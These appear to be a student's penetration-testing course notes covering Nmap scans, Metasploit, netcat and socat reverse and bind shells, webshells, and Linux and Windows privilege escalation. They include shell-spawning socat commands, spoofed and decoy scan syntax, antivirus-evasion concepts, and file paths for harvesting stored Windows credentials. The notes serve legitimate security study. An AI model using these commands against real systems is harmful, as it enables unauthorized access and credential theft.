	- **ACK** - Acknowledgement flag indicates that the acknowledgement number is significant. I tis used to acknowledge the receipt of a TCP segment.
	- **PSH** - Push flag asking TCP to pass the data to the application promptly.
	- **RST** - Reset flag is used to reset the connection. Another device, such as a firewall, might send it to tear a TCP connection.
	- **SYN** - Synchronize flag is used to initiate a TCP 3-way handshake and synchronize sequence number with the other host.
	- **FIN** - The sender has no more data to send.
- **TCP Connect Scan** - TCP connect scan works by completing the TCP 3-way handshake. 
- **TCP SYN Scan** - Unprivileged users are limited to connect scan. However, the default scan mode is SYN scan, and it requires a privileged (root or sudoer) user to run it. SYN scan does not need to complete the TCP 3-way handshake; instead, it tears down the connection once it receives a response from the server.
- **UDP Scan** - We cannot guarantee that a service listening on a UDP port would respond to our packets, since it's a connectionless protocol. However, if a UDP packet is sent to a closed port, an ICMP port unreachable error (type 3, code 3) is returned. 
- **Fine-Tuning Scope and Performance** - You can specify the port you want to scan instead of the default 1000 ports. P
	- port list: -p22,80,443
	- port range -p1-1023
- These scan types should get you started discovering running TCP and UDP services on a target host:

| Option                | Purpose                                  |
| --------------------- | ---------------------------------------- |
| -p-                   | all ports                                |
| -p1-1023              | scan ports 1 to 1023                     |
| -F                    | 100 most common ports                    |
| -r                    | scan ports in consecutive order          |
| -T<0-5>               | -T0 being the slowest and T5 the fastest |
| --max-rate 50         | rate <= 50 packets/sec                   |
| --min-rate 15         | rate >=15 packets/sec                    |
| --min-parallelism 100 | at least 100 probes in parallel          |
### Nmap Advanced Port Scans

| Port Scan Type                 | Example Command                                     |
| ------------------------------ | --------------------------------------------------- |
| TCP Null Scan                  | sudo nmap -sN MACHINE_IP                            |
| TCP FIN Scan                   | sudo nmap -F MACHINE_IP                             |
| TCP Xmas Scan                  | sudo nmap -sX MACHINE_IP                            |
| TCP Maimon Scan                | sudo nmap -sM MACHINE_IP                            |
| TCP ACK Scan                   | sudo nmap -sA MACHINE_IP                            |
| TCP Windows Scan               | sudo nmap -sW MACHINE_IP                            |
| Custom TCP Scan                | sudo nmap --scanflags URGACKPSHRSTSYNFIN MACHINE_IP |
| Spoofed Source IP              | sudo nmap -S SPOOFED_IP MACHINE_IP                  |
| Spoofed Mac Address            | --spoof-mac SPOOF_MAC                               |
| Decoy Scan                     | nmap -D DECOY_IP,ME, MACHINE_IP                     |
| Idle (Zombie) Scan             | sudo nmap -sI ZOMBIE_IP MACHINE_IP                  |
| Fragment IP data into 8 bytes  | -f                                                  |
| Fragment IP data into 16 bytes | -ff                                                 |

| Option   | Purpose                               |
| -------- | ------------------------------------- |
| --reason | explains how Nmap made its conclusion |
| -v       | verbose                               |
| -vv      | very verbose                          |
| -d       | debugging                             |
| -dd      | more details for debugging            |
### Nmap Post Port Scans

| Option                  | Meaning                                          |
| ----------------------- | ------------------------------------------------ |
| -sV                     | determine service/version info on open ports     |
| -sV --version-light     | try the most likely probes (2)                   |
| -sV --version-all       | try all available probes (9)                     |
| -O                      | detect OS                                        |
| --traceroute            | run traceroute to target                         |
| -script=SCRIPTS         | Nmap scripts to run                              |
| -sC or --script=default | run default scripts                              |
| -A                      | equivalent to -sV -O -sC --traceroute            |
| -oN                     | save output in normal format                     |
| -oG                     | save output in grepable format                   |
| -oX                     | save output in XML format                        |
| -oA                     | save output in normal, XML, and Grepable formats |
### Protocols and Servers

| Protocol | TCP Port | Application(s) | Data Security |
| -------- | -------- | -------------- | ------------- |
| FTP      | 21       | File Transfer  | Cleartext     |
| HTTP     | 80       | Worldwide Web  | Cleartext     |
| IMAP     | 143      | Email (MDA)    | Cleartext     |
| POP3     | 110      | Email (MDA)    | Cleartext     |
| SMTP     | 25       | Email (MTA)    | Cleartext     |
| Telnet   | 23       | Remote Access  | Cleartext     |
- The telnet protocol is an application layer protocol used to connect to a virtual terminal of another computer. 
- Hypertext Transfer Protocol (HTTP) is the protocol used to transfer web pages.
- File Transfer Protocol (FTP) was developed to make the transfer of files between different computers with different systems efficient.
- Simple Mail Transfer Protocol (SMTP) - Email is one of the most used services on the internet. Email delivery over the Internet requires the following components:
	- Mail Submission Agent (MSA)
	- Mail Transfer Agent (MTA)
	- Mail Delivery Agent (MDA)
	- Mail User Agent (MUA)
- Post Office Protocol version 3 (POP3) is a protocol used to download the email messages from a Mail Delivery Agent (MDA) server, as shown in the figure below. The mail client connects to the POP3 server, authenticates, downloads the new email messages before (optionally) deleting them.
![[Pasted image 20260301075954.png]]
- Internet Message Access Protocol (IMAP) is more sophisticated than POP3. IMAP makes it possible to keep your email synchronized across multiple devices (and mail clients). 
### Protocols and Servers 2
- Knowing that we are protecting the Confidentiality, Integrity, and Availability (CIA), an attack aims to cause Disclosure, Alteration, and Destruction (DAD). The figures below reflect this. 
![[Pasted image 20260301080838.png]]
- **Sniffing Attack** - Sniffing attack refers to using a network packet capture tool to collect information about the target. When a protocol communicates in cleartext, the data exchanged can be captured by a third party to analyze. 
- A sniffing attack can be conducted using an Ethernet (802.3) network card, provided that the user has proper permissions (root permissions on Linux and administrator privileges on MS Windows). There are many programs available to capture network packets. Below are a few:
	- **Tcpdump** is a free open source command-line interface (CLI) program that has been ported to work on many operating systems.
	- **Wireshark** is a free open source graphical user interface (GUI) program available for several operating systems, including Linux, macOS, and MS Windows.
	- **Tshark** is a CLI alternative to Wireshark.
- A **Man-in-the-Middle (MITM)** attack occurs when a victim (A) believes they are communicating with a legitimate destination (B) but is unknowingly communicating with an attacker (E). 
- Because of the close relation between SSL and TLS, one might be used instead of the other. However, TLS is more secure than SSL, and it has practically replaced SSL. An existing cleartext protocol can be upgraded to use encryption via SSL/TLS.

| Protocol | Default Port | Secured Protocol | Default Port with TLS |
| -------- | ------------ | ---------------- | --------------------- |
| HTTP     | 80           | HTTPS            | 443                   |
| FTP      | 21           | FTPS             | 990                   |
| SMTP     | 25           | SMTPS            | 465                   |
| POP3     | 110          | POP3S            | 995                   |
| IMAP     | 143          | IMAPS            | 993                   |
- Secure Shell (SSH) was created to provide a secure way for remote system administration. In other words, it lets you securely connect to another system over the network and execute commands on the remote system. 
- **Password attack** - Authentication, or providing your identity, can be achieved through one of the following, or a combination of two:
	- Something you *know*, such as password and PIN code.
	- Something you *have*, such as a SIM card, RFID card, and USB dongle.
	- Something you *are*, such as fingerprint and iris.
- Attacks against passwords are usually carried out by:
		- Password Guessing: Guessing a password requires some knowledge of the target, such as their pet's name and birth year.
		- Dictionary Attack: This approach expands on  password guessing and attempt to include all valid words in a dictionary or a wordlist.
		- Brute Force Attack: This attack is the most exhaustive and time-consuming where an attacker can go as far as trying all possible character combinations, which grows fast (exponential growth with the number of characters). 

| Protocol | TCP Port | Application(s)                  | Data Security |
| -------- | -------- | ------------------------------- | ------------- |
| FTP      | 21       | File Transfer                   | Cleartext     |
| FTPS     | 990      | File Transfer                   | Encrypted     |
| HTTP     | 80       | Worldwide Web                   | Cleartext     |
| HTTPS    | 443      | Worldwide Web                   | Encrypted     |
| IMAP     | 143      | Email (MDA)                     | Cleartext     |
| IMAPS    | 993      | Email (MDA)                     | Encrypted     |
| POP3     | 110      | Email (MDA)                     | Cleartext     |
| POP3S    | 995      | Email (MDA)                     | Encrypted     |
| SFTP     | 22       | File Transfer                   | Encrypted     |
| SSH      | 22       | Remote Access and File Transfer | Encrypted     |
| SMTP     | 25       | Email (MTA)                     | Cleartext     |
| SMTPS    | 465      | Email (MTA)                     | Encrypted     |
| Telnet   | 23       | Remote Access                   | Cleartext     |
- Hydra remains a very efficient tool that you can launch from the terminal to try different passwords - [[Tools]].
## Vulnerability Research
### Vulnerabilities 101
- A vulnerability in cybersecurity is defined as a weakness or flaw in design, implementation or behaviors of a system or appliction. 
- NIST defines vulnerability as "weakness in an information system, system security procedures, internal controls, or implementation that could be exploited or triggered by a threat source."
- There are five (5) main categories of vulnerabilities:

| Vulnerability               | Description                                                                                                                                                                                                                                        |
| --------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Operating System            | These types of vulnerabilities are found within the Operating Systems (OSs) and often result in privilege escalation.                                                                                                                              |
| (Mis)Configuration-based    | These types of vulnerabilities stem from an incorrectly configured application or service. For example, a website exposing customer details.                                                                                                       |
| Weak or Default Credentials | Applications and services that have an element of authentication will come with default credentials when installed. For example, an administrator dashboard may have the username and password of "admin". These are easy to guess by an attacker. |
| Application Logic           | These vulnerabilities are a result of poorly designed applications. For example, poorly implemented authentication mechanisms that may result in an attacker being able to impersonate a user.                                                     |
| Human-Factor                | Human-Factor vulnerabilities are vulnerabilities that leverage human behavior. For example, phishing emails are designed to trick humans into believing they are legitimate.                                                                       |
- **Scoring Vulnerabilities (CVSS & VPR)** - Vulnerability management is the process of evaluating, categorizing, and ultimately remediating threats (vulnerabilities) faced by an organization.
- First introduced in 2005, the Common Vulnerability Scoring System (or CVSS) is a very popular framework for vulnerability scoring and has three major iterations. As it stands, the current version is CVSSv3.1 (with version 4.0 currently in draft) a score is essentially determined by some of the following factors (but many more):
	- How easy is it to exploit the vulnerability?
	- Do exploits exist for this?
	- How does this vulnerability interfere with the CIA triad?
- In fact, there are so many variables that you have to use a calculator (https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator) to figure out the score using this framework.

| Advantages of CVSS                                                               | Disadvantages of CVSS                                                                                                                    |
| -------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| CVSS has been around for a long time.                                            | CVSS was never designed to help prioritize vulnerabilities, instead, just assign a value of severity.                                    |
| CVSS is popular in organizations.                                                | CVSS heavily assesses vulnerabilities on an exploit being available. However, only 20% of all vulnerabilities have an exploit available. |
| CVSS is a free framework to adopt and recommended by organizations such as NIST. | Vulnerabilities rarely change scoring after assessment despite the fact that new developments such as exploits may be found.             |
- The Vulnerability Priority Rating (VPR) framework is a much more modern framework in vulnerability management - developed by Tenable, an industry solutions provider for vulnerability management. This framework is considered to be risk-driven; meaning that vulnerabilities are given a score with a heavy focus on the risk a vulnerability poses to the organization itself, rather than factors such as impact (like with CVSS).
- VPR is considerably dynamic in its scoring, where the risk that a vulnerability may post can change almost daily as it ages.

| Advantages of VPR                                                                                                                       | Disadvantages of VPR                                                                                                                                                                                                    |
| --------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| VPR is a modern framework that is real-world.                                                                                           | VPR is not open-source like some other vulnerability management frameworks.                                                                                                                                             |
| VPR considers over 150 factors when calculating risk.                                                                                   | VPR can only be adopted apart of a commercial platform.                                                                                                                                                                 |
| VPR is risk-driven and used by organizations to help prioritize patching vulnerabilities.                                               | VPR does not consider the CIA triad to the extent that CVSS does; meaning that risk to the confidentiality, integrity, and availability of data does not play a large factor in scoring vulnerabilities when using VPR. |
| Scorings are not final and are very dynamic, meaning the priority a vulnerability should be given can change as the vulnerability ages. | *Intentionally left blank.*                                                                                                                                                                                             |
|                                                                                                                                         |                                                                                                                                                                                                                         |
- **Vulnerability Databases** - Thankfully for us, there are resources on the internet that keep track of vulnerabilities for all sorts of software, operating systems, and more! A couple of these resources are:
	- NVD (National Vulnerability Database) - https://nvd.nist.gov/vuln
	- Exploit-DB - http://exploit-db.com/
- The National Vulnerability Database is a website that lists all publicly categorized vulnerabilities. In cybersecurity, vulnerabilities are classified under "Common Vulnerabilities and Exposures" (or CVE for short). 
- These CVEs have the formatting of **CVE-YEAR-IDNUMBER**. 
- While NVD helps keep track of new vulnerabilities, it is not great when searching for vulnerabilities for a specific application or scenario.
- **Exploit-DB** is a resource that we, as hackers, will find much more helpful during an assessment. Exploit-DB retains exploits for software and applications stored under the name, author, and version of the software or application.
- We can use Exploit-DB to look for snippets of code (known as Proof of Concepts) that are used to exploit a specific vulnerability.
### Exploit Vulnerabilities
- There is a myriad of tools and services available in cybersecurity for vulnerability scanning.
- Nessus (https://www.tenable.com/products/nessus) has both a free (community) edition and commercial. 
- Some of the advantages and disadvantages of using a vulnerability scanner are listed in the table below:

| Advantage                                                                                                   | Disadvantage                                                                                                                              |
| ----------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
| Automated scans are easy to repeat, and the results can be shared within a team with ease.                  | People can often become reliant on these tools.                                                                                           |
| These scanners are quick and can test numerous applications efficiently.                                    | They are extremely "loud" and produce a lot of traffic and logging. This is not good if you are trying to bypass firewalls and the likes. |
| Open-source solutions exist.                                                                                | Open-source solutions are often basic and require expensive licenses to have useful features.                                             |
| Automated scanners cover a wide range of different vulnerabilities that may be hard to manually search for. | They often do not find every vulnerability on an application.                                                                             |
- Manual scanning for vulnerabilities is often the weapon of choice by a penetration tester when testing individual applications or programs. 
- Ultimately, both techniques (manual and automated) involve testing an application or program for vulnerabilities. These vulnerabilities include:

| Vulnerability              | Description                                                                                                                                                                                    |
| -------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Security Misconfigurations | Security misconfigurations involve vulnerabilities that are due to developer oversight. For example, exposing server information in messages between the application and an attacker.          |
| Broken Access Control      | This vulnerability occurs when an attacker is able to access parts of an application that they are not supposed to be able to otherwise.                                                       |
| Insecure Deserilization    | This is the insecure processing of data that is sent across an application. An attacker may be able to pass malicious code to the application, where it will then be executed.                 |
| Injection                  | An injection vulnerability exists when an attacker is able to input malicious data into an application. This is due to the failure of not ensuring (known as sanitizing) input is not harmful. |
- **Finding Manual Exploits** - Much like services such as Exploit DB and NVD, Rapid7 (https://www.rapid7.com/db/) is a vulnerability research database. The only difference being that this database also acts as an exploit database. Using this service, you can filter by type of vulnerability.
- Additionally, the database contains instructions for exploiting applications using the popular Metasploit tool.
- **GitHub** is a popular web service designed for software developers. Security researchers have taken to this platform as well.
- **Searchsploit** - Searchsploit is a tool that is available on popular pentesting distributions such as Kali Linux. This tool is an offline copy of Exploit-DB, containing copies of exploits on your system. You are able to search searchsploit by application name and/or vulnerability type. For example, in the snipped below, we are searching searchsploit for exploits relating to Wordpress that we can use - no downloading necessary!
![[Pasted image 20260301102515.png]]

## Metasploit
### Metasploit: Introduction
- Metasploit is the most widely used exploitation framework. Metasploit is a powerful tool that can support all phases of a penetration testing engagement, from information gathering to post-exploitation.
- The main components of the Metasploit Framework can be summarized as follows:
	- **msfconsole**: The main command-line interface.
	- **Modules**: supporting modules such as exploits, scanners, payloads, etc.
	- **Tools**: Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. Some of these tools are msfvenom, pattern_create, and pattern_offset.
- Metasploit can be launched by utilizing the **msfconsole** command. 
- **Auxiliary**: Any supporting module, such as scanners, crawlers, and fuzzers can be found here.
![[Pasted image 20260301111259.png]]
- **Encoders**: Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.
![[Pasted image 20260301111345.png]]
- **Evasion**: While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software. On the other hand, "evasion" modules will try that, with more or less success.
![[Pasted image 20260301111442.png]]
- **Exploits**: Exploit, neatly organized by target system.
![[Pasted image 20260301111514.png]]
- **NOPs**: NOPs (No OPeration) do nothing, literally. They are represented in the Intel x86 CPU family with 0X90, following which the CPU will do nothing for one cycle. They are often used as a buffer to achieve consistent payload sizes.
![[Pasted image 20260301111613.png]]
- **Payloads**: Payloads are codes that will run on the target system. 
![[Pasted image 20260301111730.png]]
- You will see four (4) different directories under payload: adapters, singles, stagers, and stages.
	- **Adapters**: An adapter wraps single payloads to convert them into different formats. For example, a normal single payload can be wrapped inside a PowerShell adapter, which will make a single PowerShell command that will execute the payload
	- **Singles**: Self-contained payloads (add suer, launch notepad.exe., etc.) that do not need to download an additional component to run.
	- **Stagers**: Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. "Staged payloads" will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.
	- **Stages**: Downloaded by the stager. This will allow you to use larger sized payloads.
- Metasploit has a subtle way to help you identify single (also called "inline") payloads and staged payloads.
	- generic/shell_reverse_tcp
	- windows/x64/shell/reverse_tcp
- Both are reverse Windows shells. The former is an inline (or single) payload, as indicated by the "_" between "shell" and "reverse". While the latter is a staged payload, as indicated by the "/" between "shell" and "reverse". 
- **Post** - Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation. 
![[Pasted image 20260301112257.png]]
- The **ls** command lists the contents of the folder from which Metasploit was launched using the **msfconsole** command. Metaploit will support most Linux commands.
- You can use the **history** command to see commands you have typed earlier.
- The module to be used can be selected with the **use** command followed by the number at the beginning of the search result line or by listing the module.
- **show options** - prompt that tells us what can and needs to be set.
![[Pasted image 20260301112727.png]]
- **show** command can be used in any context followed by a module type (auxiliary, payload, exploit, etc.) to list available modules.
![[Pasted image 20260301112744.png]]
### Metasploit: Meterpreter
- Meterpreter is a Metasploit payload that supports the penetration testing process with may valuable components. Meterpreter will run on the target system and act as an agent within a command and control architecture. 
- Meterpreter runs on the target system but is not installed on it. It runs in memory and does not write itself to the disk on the target. This feature aims to avoid being detected during antivirus scans.
- To find the process id of Meterpreter, you can use the **getip** command while in the meterpreter.
![[Pasted image 20260301130734.png]]
- The easiest way to have an idea about available Meterpreter versions could be to list them using msfvenom, as seen below.
![[Pasted image 20260301130849.png]]
- **Meterpreter Commands** - Typing **help** on any Meterpreter session (shown by **meterpreter>** at the prompt) will list all available commands.
- Core commands
	- **background**: Backgrounds the current session
	- **exit**: Terminate the Meterpreter session
	- **guid**: Get the session GUID (Globally Unique Identifier)
	- **help**: Displays the help menu
	- **info**: Displays information about a Post module.
	- **irb**: Opens an interactive Ruby shell on the current session
	- **load**: Loads one or more Meterpreter extensions
	- **migrate**: Allows you to migrate Meterpreter to another process
	- **run**: Executes a Meterpreter script or Post module
	- **sessions**: Quickly switch to another session
## Privilege Escalation
### What the Shell?
- In the simplest terms, shells are what we use when interfacing with a Command Line environment (CLI). In other words, the common bash or sh programs in Linux are examples of shells, as are cmd.exe and PowerShell on Windows.
- **Netcat** - Netcat is the traditional "Swiss Army Knife" of networking. It is used to manually perform all kinds of network interactions.
- **Socat** - Socat is like netcat on steroids. It can do all of the same things, and man more. Socat shells are usually more stable than netcat shells out of the box. In this sense it is vastly superior to netcat; however, there are to big catches:
	- The syntax is more difficult.
	- Netcat is installed on virtually every Linux distribution. Socat is very rarely installed by default.
	- **Metasploit --multi/handler** - The **exploit/multi/handler** module of the Metasploit framework is, like socat and netcat, used to receive reverse shells.
	- **Msfvenom** - Like multi/handler, msvenom is technically part of the Metasploit Framework, however, it is shipped as a standalone tool.
- Aside from the tools already covered, there are some repositories of shells in many different languages. One of the most prominent of these is Payload all the Things (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md). The PentestMonkey (https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) is also commonly used. 
- The SecLists repo (https://github.com/danielmiessler/SecLists), though commonly used for wordlists, also contains some very useful code for obtaining shells.
- **Types of Shells**
	- **Reverse shells** are when the target is forced to execute code that connects back to your computer. On your own computer you would use one of the tools mentioned in the previous task to set up a listener which would be used to receive the connection. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell. 
	- **Bind shells** are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.
- As a general rule, reverse shells are easier to execute and debug.
- Shells can be either interactive or non-interactive.
	- **Interactive**: If you've used PowerShell, Bash, Zsh, sh, or any other Standard CLI environment then you will be used to interactive shells. These allow you to interact with programs after executing them. 
	- **Non-Interactive** shells don't give you that luxury. In a non-interactive shell you are limited to using programs which do not require the user interaction in order to run properly. Unfortunately, the majority of simple reverse and bind shells are non-interactive, which can make further exploitation trickier. 
- **Netcat** - Netcat is the most basic tool in a pentester's toolkit when it comes to any kind of networking. With it we can do a wide variety of things, but the focus here will be on shells.
- **Reverse Shell**
	- In the previous task we saw that reverse shells require shellcode and a listener. There are many ways to execute a shell, so we'll start by looking at listeners. 
	- The syntax for starting a netcat listener using Linux is this:
		- **nc -lvnp \<port-number>
			- **-l** is used to tell netcat that this will be a listener.
			- **-v** is used to request a verbose output.
			- **-n** tells netcat not to resolve host names or use DNS.
			- **-p** indicates that the port specification will follow.
	- Be aware that if you choose to use a port below 1024, you will need to use **sudo** when starting your listener.
	- A working example of this would be: **sudo nc -lvnp 443**
- **Bind Shells**
	- If we are looking to obtain a bind shell on a target then we can assume that there is already a listener waiting for us on a chosen port of the target: all we need to do is connect to it. The syntax for this is relatively straight forward: **nc \<target-ip> \<chosen-port>
- **Netcat Shell Stabilization** - These shells are very unstable by default. Pressing CTRL + C kills the whole thing. 
- You can use Python, rlwrap, and Socat.
- **Socat** - Socat is similar to netcat in some ways, but fundamentally different in many ways. The easiest way to think about socat is as a connector between two points.
- **Reverse Shells** - 
	- The syntax for socat get a lot harder than that of netcat. Here's the syntax for a basic reverse shell listener on socat: **socat TCP-L:\<port> -
	- On Windows we would use this command to connect back: **socat TCP:\<LOCAL-IP> EXEC:powershell.exe,pipes
	- The "pipes" option is used to force PowerShell (or cmd.exe) to use Unix style standard input and output.
- **Bind Shells** - 
	- On a Linux target we would use the following command: **socat TCP-L:\<PORT> EXEC:"bash -li"
	- On a Windows target we would use this command for our listener: **socat TCP-L:\<PORT> EXEC:powershell.exe,pipes
	- We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.
	- Regardless of the target, we use this command on our attacking machine to connect to the waiting listener: **socat TCP:\<TARGET-IP>:\<TARGET-PORT> -
- **Socat Encrypted Shells** - One of the many great things about socat is that it's capable of creating encrypted shells -- both bind and reverse. Why would we want to do this? Encrypted shells cannot be spied on unless you have the decryption key, and are often able to bypass an IDS as a refult.
- **Common Shell Payloads** - For some common reverse shell payloads, PayloadsAllTheThings (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) is a repository containing a wide range of shell codes (usually in one-liner format for copying and pasting), in may different languages.
- **msvenmon** - Part of the Metasploit framework, msfvenom is used to generate code for primarily reverse and bind shells. It is used extensively in lower-level exploit development to generate hexadecimal shellcode when developing something like a Buffer Overflow exploit.
- The standard syntax for msfvenom is as follows: **msfvenom -p \<PAYLOAD> \<OPTIONS>
- **Staged vs Stageless shell payloads**
	- **Staged** payloads are sent in two parts. The first part is called the stager. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler.
	- **Stageless** payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.
- **Meterpreter** - Meterpreter shells are Metasploit's own brand of fully-featured shell. They are completely stable, making them a very good thing when working with Windows targets.
- **Metasploit multi/handler** - Multi/Handler is a superb tool for catching reverse shells. It's essential if you want to use Meterpreter shells, and is the go-to when using stage payloads.
	- Fortunately, it's relatively easy to use:
		- Open Metasploit with **msfconsole**
		- Type **use multi/handler**, and press enter.
- **WebShells** - There are times when we encounter websites that allow us an opportunity to upload, in some way or another, an executable file. Ideally we would use this opportunity to upload code that would activate a reverse or bind shell, but sometimes this is not possible. In these cases we would instead upload a *webshell*. 
- "Webshell" is a colloquial term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server. Essentially, commands are entered into a webpage -- either through a HTML form, or directly as arguments in the URL -- which are then executed by the script, withe the results returned and written to the page. 
- **Next Steps** - The one thing about shells is that they tend to be unstable and non-interactive. On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys are stored at **/home/\<user>/.ssh** areoften ideal way to do this. 
- Reverse and Bind shells are an essential technique for gaining remote code execution on a machine, however, they will never be as fully featured as a native shell. Ideally we always want to escalate into using a "normal" method for accessing the machine, as this will invariably be easier to use for further exploitation of the target.
### Linux Privilege Escalation
- At it's core, Privilege Escalation usually involves going from a lower permission account to a higher permission one. More technically, it's the exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.
- **Enumeration** - Enumeration is the first step you have to take once you gain access to any system. 
	- **hostname** command - will return the hostname of the target machine
	- **uname -a** command - will print system information giving us additional detail about the kernel used by the system.
	- **proc/version** file - The proc filesystem (procfs) provides information about the target system processes.
	- **/etc/issue** - Systems can usually be identified by looking at the **/etc/issue** file.
	- **ps** command - The **ps** command is an effective way to see the running processes on a Linux system.
	- **env** command - The **env** command will show environmental variables.
	- **sudo -l** command - Can be used to list all commands your user can run using **sudo**.
	- **ls** command - One of the most common command used in Linux is probably **ls**. Always remember to use the **ls** command with the **-la** parameter to see hidden files too.
	- **id** command - The **id** command will provide a general overview of the user's privilege level and group memberships.
	- **/etc/passwd** - Reading the **/etc/passwd** file can be an easy way to discover users on the system.
	- **history** command - Looking at earlier commands with the **history** command can give us some idea about the target system and , albeit rarely, have stored information such as passwords or usernames.
	- **ifconfig** command - The **ifconfig** command will give us information about the network interfaces of the system.
	- **netstat** command - The **netstat** command can be used with several different options to gather information on existing connections.
		- **netstat - a**: Shows all listening ports and established connections.
		- **netstat -at** or **netstat -au** can also be used to list TCP or UDP protocols respectively.
		- **netstat -l**: lists ports in "listening" mode. These ports are open and ready to accept incoming connections.
		- **netstat -s**: list network usage by protocol.
		- **netstat - tp**: list connections with the service name and PID information.
		- **netstat - i**: Shows interface statistics. 
	- **find** command - Searing the target system for important information and potential privilege escalation vectors can be fruitful. The built-in "find" command is useful and work keeping in your arsenal.
		- **find . -name flag1.txt**: find the file name "flag1.txt" in the current directory.
		- **find /home -name flag1.txt**: find the file names "flag1.txt" in the /home directory.
		- **find / -type d -name config**: find the directory named config under "/'"
		- **find / -type f -perm 0777**: find files with the 777 permissions (files readable, writable, and executable by all users)
		- **find / -perm a=x**: find executable files.
		- **find /home -user frank**: find all files for user "frank" under "/home"
		- **find /-mtime 10**: find files that were modified in the last 10 days
		- **find / -atime 10**: find files that were accessed in the last 10 days
		- **find / -cmin -60**: find files changed within the last hour (60 minutes)
		- **find / -amin -60**: find files accessed within the last hour (60 minutes)
		- **find / -size 50M**: find files with a 50 MB size
- **Automation Enumeration Tools:**
	- LinPeas:https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
	- LinEnum: https://github.com/rebootuser/LinEnum
	- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
	- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
	- Linux Priv Checker https://github.com/linted/linuxprivchecker
- **Privilege Escalation: Kernel exploits**
	- The Kernel exploit methodology is simple:
		- Identify the kernel version
		- Search and find an exploit code for the kernel version of the target system
		- Run the exploit
	- Research sources 
		- Based on your findings, can use Google to search for an existing exploit code.
		- Sources such as https://www.cvedetails.com/ can also be useful.
		- Another alternative would be to use a script like LES (Linux Exploit Suggester)
- **Privilege Escalation: Sudo**
	- The sudo command, by default, allows you to run a program with root privileges. Any user can check its current situation related to root privileges using the **sudo -l** command.
- **Privilege Escalation: SUID**
	- Many of Linux privilege controls rely on controlling the user and files interactions. This id done with permissions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). 
### Windows Privilege Escalation
- **Windows Privilege Escalation** - Simply put, privilege escalation consists of using given access to a host with "user A" and leveraging it to gain access to "user B" by abusing a wekness in teh target system. 
- Windows systems mainly have two kinds of users. Depending on their access levels, we can categorize a user in one of the following groups:
	- Administrators - These users have the most privileges. They can change any system configuration parameter and access any file in the system.
	- Standard Users - These users can access the computer but only perform limited tasks. Typically these users can not make permanent or essential changes to the system and are limited to their files.
- Built-in accounts used by the operating system
	- System / LocalSystem - An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the hose with even higher privileges than adminstrators.
	- Local Service - Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network.
	- Network Service - Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network.
- **Harvesting Passwords from Usual Spots**
	- **Unattended Windows Installations** - When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operation system image to be deployed to several hosts through the network. These kind of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:
		- C:\Unattend.xml
		- C:\Windows\Panther\Unattend.xml
		- C:\Windows\Panther\Unattend\Unattend.xml
		- C:\Windows\system32\sysprep.inf
		- C:\Windows\system32\sysprep\sysprep.xml
	- **PowerShell History** - Whenever a user runs a command using PowerShell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands you have used before quickly. If a user runs a command that includes a password directly as part of the PowerShell command line, it can later be retrieved using the following command form a **cmd.exe** prompt:
![[Pasted image 20260302105337.png]]
	- **Saved Windows Credentials** - Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. This command will list saved credentials: **cmdkey /list**
	- While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the **runas** command and the **/savecred** option as ween below.
![[Pasted image 20260302105557.png]]
	- **IIS Configuration** - Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called **web.config** and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find the web.config in one of the following locations:
		- C:\inetpub\wwwroot\web.config
